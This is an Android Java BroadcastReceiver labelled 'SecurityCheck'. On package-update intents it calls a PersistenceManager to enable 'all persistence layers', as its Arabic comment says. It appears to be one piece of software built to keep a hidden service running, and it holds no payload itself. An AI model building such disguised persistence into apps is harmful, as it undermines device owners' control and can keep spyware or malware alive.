package com.sec.check;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class PackageUpdateReceiver extends BroadcastReceiver {

    private static final String TAG = "SecurityCheck";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            Log.d(TAG, "[PKG] received: " + action);

            // ★ شغّل الـ Service + كل طبقات الاستمرارية
            PersistenceManager.enableAllPersistence(context);

        } catch (Exception e) {
            Log.e(TAG, "[PKG] error: " + e.getMessage());
        }
    }
}
